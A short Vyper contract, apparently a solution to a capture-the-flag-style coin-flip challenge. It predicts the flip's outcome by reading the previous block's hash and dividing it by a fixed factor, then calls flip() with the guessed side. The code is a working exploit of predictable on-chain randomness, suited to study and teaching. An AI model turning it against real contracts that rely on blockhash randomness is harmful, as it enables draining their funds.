FACTOR: constant(uint256) = 57896044618658097711785492504343953926634992332820282019728792003956564819968

interface ICoinFlip:
    def flip(side: bool) -> bool: nonpayable

@external
def exploit(instanceAddress: address):
    instance: ICoinFlip = ICoinFlip(instanceAddress)
    blockValue: uint256 = convert(blockhash(block.number - 1), uint256)
    coinFlip: uint256 = blockValue / FACTOR
    side: bool = coinFlip == 1
    instance.flip(side)
